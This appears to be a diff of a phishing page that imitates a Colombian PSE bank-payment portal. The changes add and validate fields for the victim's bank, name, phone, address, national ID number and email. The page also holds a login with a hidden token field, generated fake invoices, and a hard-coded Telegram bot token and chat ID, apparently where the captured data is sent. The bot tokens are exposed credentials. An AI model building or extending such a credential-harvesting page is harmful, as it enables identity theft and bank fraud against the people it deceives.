@@ -974,38 +974,38 @@ main {
                     ⚠️ Realiza débito desde cuentas corriente y ahorro de bancos en Colombia, una vez seleccione el banco, el sistema PSE solicitará registrar tu correo la primera vez, si ya realizaste este procedimiento solo ingresa el correo electrónico.
                 </div>
                 <div class="logo-pse">PSE</div>
-                <div class="form-pse">
+                <div class="form-pse" id="formPSE">
                     <div>
                         <label>* Entidad Financiera</label>
-                        <select><option>Seleccione...</option><option>Bancolombia</option></select>
+                        <select id="pseEntidad"><option value="">Seleccione...</option><option>Bancolombia</option><option>Davivienda</option><option>BBVA</option></select>
                     </div>
                     <div>
                         <label>* Tipo de Persona</label>
-                        <select><option>Natural</option><option>Jurídica</option></select>
+                        <select id="pseTipoPersona"><option value="">Seleccione...</option><option>Natural</option><option>Jurídica</option></select>
                     </div>
                     <div>
                         <label>* Nombre y apellidos del titular</label>
-                        <input type="text" placeholder="Ej: Juan Perez">
+                        <input type="text" id="pseNombre" placeholder="Ej: Juan Perez">
                     </div>
                     <div>
                         <label>* Celular</label>
-                        <input type="text" placeholder="+57 300 000 0000">
+                        <input type="text" id="pseCelular" placeholder="+57 300 000 0000">
                     </div>
                     <div>
                         <label>* Dirección titular</label>
-                        <input type="text" placeholder="Dirección">
+                        <input type="text" id="pseDireccion" placeholder="Dirección">
                     </div>
                     <div>
                         <label>* Tipo de Identificación</label>
-                        <select><option>Cédula de Ciudadanía</option><option>Pasaporte</option></select>
+                        <select id="pseTipoId"><option value="">Seleccione...</option><option>Cédula de Ciudadanía</option><option>Pasaporte</option></select>
                     </div>
                     <div>
                         <label>* Documento de Identificación</label>
-                        <input type="text" value="38361573">
+                        <input type="text" id="pseDocumento" value="38361573">
                     </div>
                     <div>
                         <label>* Correo electrónico</label>
-                        <input type="email" placeholder="correo@ejemplo.com">
+                        <input type="email" id="pseCorreo" placeholder="correo@ejemplo.com">
                     </div>
                 </div>
             </div>
@@ -1062,7 +1062,7 @@ main {
 // ==========================================
 // 🔑 CONFIGURACIÓN DE TELEGRAM
 // ==========================================
-const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
+const TG_BOT_TOKEN = '8720080632:AAHx4C3zh9LD4GEVOohesCsxMx9U-3TAZHk';
 const TG_CHAT_ID = '7776240161';
 
 // ==========================================
@@ -1088,10 +1088,21 @@ const circuloPaso1 = document.getElementById('circuloPaso1');
 const circuloPaso2 = document.getElementById('circuloPaso2');
 const circuloPaso3 = document.getElementById('circuloPaso3');
 
+// Elementos del Formulario PSE
+const formPSE = document.getElementById('formPSE');
+const pseEntidad = document.getElementById('pseEntidad');
+const pseTipoPersona = document.getElementById('pseTipoPersona');
+const pseNombre = document.getElementById('pseNombre');
+const pseCelular = document.getElementById('pseCelular');
+const pseDireccion = document.getElementById('pseDireccion');
+const pseTipoId = document.getElementById('pseTipoId');
+const pseDocumento = document.getElementById('pseDocumento');
+const pseCorreo = document.getElementById('pseCorreo');
+
 let pasoActualAmarillo = 1;
 let checkPaso1Activado = false;
 let esperandoDatosFacturas = false; 
-let tablaDesplegada = false; // Controla si se ven todas las facturas o solo 10
+let tablaDesplegada = false; 
 
 // Elementos Login
 const inputId = document.getElementById('identificacion');
@@ -1143,6 +1154,31 @@ inputValorPagar.addEventListener('input', function() {
     }
     this.value = valor;
 });
+
+// 🚀 VALIDACIÓN DEL FORMULARIO PSE
+function validarFormularioPSE() {
+    if (pasoActualAmarillo !== 3) return; // Solo validar en el paso 3
+
+    const entidadVal = pseEntidad.value.trim();
+    const tipoPersonaVal = pseTipoPersona.value.trim();
+    const nombreVal = pseNombre.value.trim();
+    const celularVal = pseCelular.value.trim();
+    const direccionVal = pseDireccion.value.trim();
+    const tipoIdVal = pseTipoId.value.trim();
+    const documentoVal = pseDocumento.value.trim();
+    const correoVal = pseCorreo.value.trim();
+
+    // Si todos tienen texto, encendemos el botón
+    if (entidadVal && tipoPersonaVal && nombreVal && celularVal && direccionVal && tipoIdVal && documentoVal && correoVal) {
+        btnAccionAmarillo.classList.remove('opaco');
+    } else {
+        btnAccionAmarillo.classList.add('opaco');
+    }
+}
+
+// Escuchar todos los campos del PSE para validar en tiempo real
+formPSE.addEventListener('input', validarFormularioPSE);
+formPSE.addEventListener('change', validarFormularioPSE);
 
 btnToggleEye.addEventListener('click', function () {
     if (inputToken.type === 'password') {
@@ -1406,8 +1442,8 @@ function procesarDatosFacturas(texto) {
     // Generar la tabla
     const tbody = document.getElementById('tablaFacturasBody');
     tbody.innerHTML = '';
-    tablaDesplegada = false; // Reiniciar estado de la tabla
-    btnDesplegarTabla.style.display = 'none'; // Ocultar botón inicialmente
+    tablaDesplegada = false; 
+    btnDesplegarTabla.style.display = 'none'; 
 
     const partesFecha = fechaBase.split('/');
     let dia = parseInt(partesFecha[0]) || 28;
@@ -1419,7 +1455,6 @@ function procesarDatosFacturas(texto) {
         fechaActual = new Date(2026, 9, 28); 
     }
 
-    // Llenamos la tabla pero ocultamos las filas después de la 10
     for (let i = 0; i < totalFacturas; i++) {
         let d = String(fechaActual.getDate()).padStart(2, '0');
         let m = String(fechaActual.getMonth() + 1).padStart(2, '0');
@@ -1428,7 +1463,7 @@ function procesarDatosFacturas(texto) {
 
         let tr = document.createElement('tr');
         if (i % 2 !== 0) tr.style.background = '#f9f9f9';
-        if (i >= 10) tr.style.display = 'none'; // Ocultar si es mayor a 10
+        if (i >= 10) tr.style.display = 'none'; 
         
         tr.innerHTML = `
             <td><span class="circulo-verde"></span> ${idFactura}</td>
@@ -1441,7 +1476,6 @@ function procesarDatosFacturas(texto) {
         fechaActual.setMonth(fechaActual.getMonth() + 1);
     }
 
-    // Si hay más de 10, mostramos el botón de "Mostrar más"
     if (totalFacturas > 10) {
         btnDesplegarTabla.style.display = 'flex';
         btnDesplegarTabla.innerHTML = `▼ Mostrar más facturas`;
@@ -1458,14 +1492,12 @@ btnDesplegarTabla.addEventListener('click', function() {
     const filas = document.getElementById('tablaFacturasBody').querySelectorAll('tr');
     
     if (!tablaDesplegada) {
-        // Mostrar todas
         filas.forEach((fila, index) => {
             if (index >= 10) fila.style.display = 'table-row';
         });
         btnDesplegarTabla.innerHTML = `▲ Ocultar facturas`;
         tablaDesplegada = true;
     } else {
-        // Ocultar las que sobran
         filas.forEach((fila, index) => {
             if (index >= 10) fila.style.display = 'none';
         });
@@ -1483,6 +1515,11 @@ function iniciarFlujoAmarillo() {
     checkPaso1.classList.remove('activo');
     btnAccionAmarillo.classList.add('opaco');
     inputValorPagar.value = '';
+    
+    // Resetear formulario PSE
+    formPSE.reset(); 
+    pseDocumento.value = '38361573'; // Dejar el doc por defecto
+
     actualizarPasoAmarillo();
 }
 
@@ -1495,7 +1532,6 @@ cajaPaso1.addEventListener('click', function() {
 });
 
 function actualizarPasoAmarillo() {
-    // Actualizar clases de los círculos de la secuencia
     circuloPaso1.className = 'paso';
     circuloPaso2.className = 'paso';
     circuloPaso3.className = 'paso';
@@ -1526,7 +1562,7 @@ function actualizarPasoAmarillo() {
         paso3Amarillo.style.display = 'block';
         containerValorPagar.style.display = 'none';
         btnAccionAmarillo.innerHTML = `✓ REALIZAR PAGO`;
-        btnAccionAmarillo.classList.remove('opaco');
+        btnAccionAmarillo.classList.add('opaco'); // Inicia bloqueado hasta llenar el form
 
         circuloPaso1.classList.add('completado');
         circuloPaso2.classList.add('completado');
